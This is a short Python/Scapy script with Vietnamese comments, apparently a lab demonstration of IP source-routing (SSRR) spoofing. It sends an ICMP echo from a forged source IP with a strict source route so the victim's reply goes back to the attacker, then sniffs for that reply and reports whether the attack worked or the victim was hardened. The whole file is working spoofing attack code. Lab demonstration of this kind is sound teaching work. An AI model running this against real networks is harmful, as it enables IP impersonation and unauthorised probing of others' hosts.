#!/usr/bin/env python3
# ssrr.py - Gui goi tin ICMP Echo kem tuy chon SSRR (Strict Source Route)
import time
from scapy.all import *

print("==================================================================")
print("[*] TAN CONG DINH TUYEN TAI NGUON (IP SOURCE ROUTING - SSRR)")
print("==================================================================")
print("    - IP nguon GIA MAO: 10.0.0.77")
print("    - IP dich (Victim):  10.0.0.2")
print("    - Tuy chon SSRR ep lo trinh phan hoi qua: 10.0.0.1 (Attacker)")

# Goi tin SSRR chuan: Dat pointer = 8 de Victim (10.0.0.2) nhan dien minh la chang den,
# va dao nguoc lo trinh (reverse route) de gui phan hoi ve 10.0.0.1
pkt = IP(src="10.0.0.77", dst="10.0.0.2",
         options=[IPOption_SSRR(routers=["10.0.0.1", "10.0.0.2"], pointer=8)]) \
      /ICMP(id=0x4242)/b"src-routed-probe-by-attacker"

# Bat may nghe len tren veth1 chi bat duy nhat goi Echo Reply (type 0) tra ve cho 10.0.0.1
sniffer = AsyncSniffer(iface="veth1", timeout=3, count=1,
                       filter="icmp and icmp[icmptype] == 0 and dst host 10.0.0.1")
sniffer.start()
time.sleep(0.2)

print("\n[*] Dang gui goi tin ICMP co tuy chon SSRR toi 10.0.0.2...")
send(pkt, verbose=0)

sniffer.join()
if sniffer.results:
    reply = sniffer.results[0]
    print(f"\n[+] TAN CONG THANH CONG!")
    print(f"    - Attacker (10.0.0.1) da hung duoc goi tin tu: {reply[IP].src}")
    print(f"    - Dich cua goi phan hoi: {reply[IP].dst}")
    print(f"\n[=>] KET LUAN:")
    print("     Mac du goi gui di mang IP gia mao la 10.0.0.77, nhung nho tuy chon SSRR,")
    print("     Victim da dao nguoc lo trinh va gui phan hoi ve dung tay Attacker (10.0.0.1)!")
    print("     Day chinh la nguy co cua Source Routing: Cho phep gia mao IP 2 chieu!")
else:
    print(f"\n[-] Attacker (10.0.0.1) KHONG nhan duoc goi phan hoi nao.")
    print("    [=>] Giai thich: Victim da loai bo goi tin (Cung co phong thu thanh cong!)")
